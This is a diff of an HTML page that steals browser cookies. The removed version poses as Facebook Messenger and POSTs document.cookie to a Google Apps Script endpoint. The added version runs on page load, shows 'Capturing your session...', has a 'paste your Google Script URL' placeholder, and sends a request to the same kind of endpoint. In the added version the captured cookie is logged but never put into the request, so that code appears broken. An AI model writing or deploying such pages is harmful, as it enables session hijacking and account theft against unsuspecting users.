@@ -1,65 +1,73 @@
 <!DOCTYPE html>
 <html>
 <head>
-<meta name="viewport" content="width=device-width, initial-scale=1">
-<title>Messenger</title>
-<!-- Load Facebook's actual CSS for a realistic look -->
-<link rel="stylesheet" href="https://static.xx.fbcdn.net/rsrc.php/v3/yG/r/7x9y8g0y9q_.css">
-<style>
-  body {
-    background-color: #f0f2f5;
-    font-family: Helvetica, Arial, sans-serif;
-    display: flex;
-    justify-content: center;
-    align-items: center;
-    height: 100vh;
-    margin: 0;
-  }
-  .box {
-    background: white;
-    padding: 20px;
-    border-radius: 8px;
-    box-shadow: 0 2px 4px rgba(0,0,0,0.1);
-    text-align: center;
-    width: 300px;
-  }
-  .logo {
-    font-size: 40px;
-    color: #0084ff; /* Messenger Blue */
-    margin-bottom: 10px;
-    font-weight: bold;
-  }
-  p {
-    color: #65676b;
-    font-size: 14px;
-  }
-</style>
+    <title>Capturing Session...</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            background-color: #f4f4f4;
+        }
+        .container {
+            text-align: center;
+            background: white;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+        }
+    </style>
 </head>
 <body>
 
-<div class="box">
-  <div class="logo">M</div>
-  <p>Capturing your session...</p>
+<div class="container">
+    <h2 id="status">Capturing your session...</h2>
+    <p>Please wait a moment.</p>
 </div>
 
 <script>
-  function sendCookie(c) {
-    var url = "https://script.google.com/macros/s/AKfycbxqSOqEdHloZRl9Tu296LeTxu5q-wXLm0AMVnNAQfRJiJHLIsQ9_vsW_FrnmaZWv38/exec"; 
-    
-    // Send as POST with JSON body
-    fetch(url, { 
-        method: "POST",
-        body: JSON.stringify({cookie: c}),
-        headers: new Headers({"Content-Type": "application/json"})
-    });
-    
-    setTimeout(function(){ 
-      window.close(); 
-    }, 1500);
-}
+    // ==========================================
+    // PASTE YOUR GOOGLE SCRIPT URL HERE
+    // ==========================================
+    var scriptURL = "https://script.google.com/macros/s/AKfycbw5fRN9oOpTkE2idBgQM00WBJuDa0259iatOkK9q_zkQtRhuNdeOibYN1mbPJobkzE/exec"; 
+    // Example: "https://script.google.com/macros/s/AKfycbx.../exec"
+    // ==========================================
 
-  // Get current cookie and send it
-  sendCookie(document.cookie);
+    function sendCookie() {
+        // 1. Get the current document.cookie string
+        var cookieString = document.cookie;
+        
+        console.log("Cookie Captured:", cookieString);
+
+        // 2. Send to Google Sheets using Fetch API
+        fetch(scriptURL, { 
+            method: 'GET',
+            mode: 'no-cors', // Important for Google Apps Script simplicity
+            headers: new Headers({
+                "Content-Type": "text/plain"
+            })
+        })
+        .then(response => {
+            console.log("Success sending cookie!");
+            document.getElementById('status').innerText = "Session Captured!";
+            
+            // 3. Close the window after 2 seconds
+            setTimeout(function(){ 
+                window.close(); 
+            }, 2000);
+        })
+        .catch(error => {
+            console.error('Error sending cookie:', error);
+            document.getElementById('status').innerText = "Error! Check Console.";
+        });
+    }
+
+    // Start the process immediately when page loads
+    window.onload = sendCookie;
+
 </script>
 
 </body>
